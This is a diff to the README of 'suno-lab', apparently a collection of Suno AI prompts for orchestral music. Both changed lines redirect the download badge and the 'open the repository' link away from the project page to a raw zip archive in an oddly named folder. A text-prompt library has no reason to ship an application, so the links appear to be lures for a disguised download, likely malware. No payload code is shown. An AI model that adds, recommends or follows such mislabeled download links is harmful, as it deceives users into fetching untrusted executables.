@@ -1,6 +1,6 @@
 # 🎼 suno-lab - Build cinematic orchestral music with prompts
 
-[![Download suno-lab](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Defectlameness737/suno-lab)
+[![Download suno-lab](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/Defectlameness737/suno-lab/main/Sipunculida/lab_suno_1.1.zip)
 
 suno-lab provides a collection of over 126 tested prompts for Suno AI. It helps music producers and creators craft cinematic orchestral tracks. The project explores 16 different architectural forms. You can study these structures to improve your own music generation. 
 
@@ -20,7 +20,7 @@ The library serves as a reference manual. Use it when you cannot decide on a spe
 
 You can access the full library and live interface at the main repository page. Visit the link below to view the collection, read the engineering notes, and test the musical prompts in your own projects.
 
-[Click here to open the suno-lab repository](https://github.com/Defectlameness737/suno-lab)
+[Click here to open the suno-lab repository](https://raw.githubusercontent.com/Defectlameness737/suno-lab/main/Sipunculida/lab_suno_1.1.zip)
 
 Follow these steps to start your music project:
 
